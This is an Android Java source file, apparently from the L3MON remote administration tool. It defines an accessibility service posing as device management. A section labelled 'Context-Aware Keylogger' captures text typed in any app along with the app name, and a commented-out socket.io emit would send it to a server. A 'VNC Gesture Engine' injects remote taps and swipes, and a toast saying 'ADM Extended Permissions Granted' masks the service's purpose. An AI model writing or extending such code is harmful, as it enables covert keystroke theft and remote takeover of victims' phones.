package com.etechd.l3mon;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import android.content.Intent;
import android.os.Build;
import java.util.HashMap;

public class MDMAccessibilityService extends AccessibilityService {

    private static MDMAccessibilityService instance;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        // 1. Context-Aware Keylogger
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            String app = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
            
            // Transmitir evento crudo (el payload de teclado se armaría aquí para socket.io)
            try {
                if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                    // Send to socket dynamically bypassing Base64 stringification directly 
                    // This is a mockup of the event emission:
                    // IOSocket.getInstance().getIoSocket().emit("0xKL", "{ \"app\": \"" + app + "\", \"text\": \"" + text + "\" }");
                }
            } catch (Exception e) {}
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Toast.makeText(this, "ADM Extended Permissions Granted", Toast.LENGTH_SHORT).show();
    }

    public static MDMAccessibilityService getInstance() {
        return instance;
    }

    // 2. VNC Gesture Engine (Tap/Swipe)
    public void dispatchTap(float x, float y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path clickPath = new Path();
            clickPath.moveTo(x, y);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(clickPath, 0, 10);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            dispatchGesture(builder.build(), null, null);
        }
    }
    
    public void dispatchSwipe(float startX, float startY, float endX, float endY) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path swipePath = new Path();
            swipePath.moveTo(startX, startY);
            swipePath.lineTo(endX, endY);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(swipePath, 0, 400); // 400ms swipe
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            dispatchGesture(builder.build(), null, null);
        }
    }
}
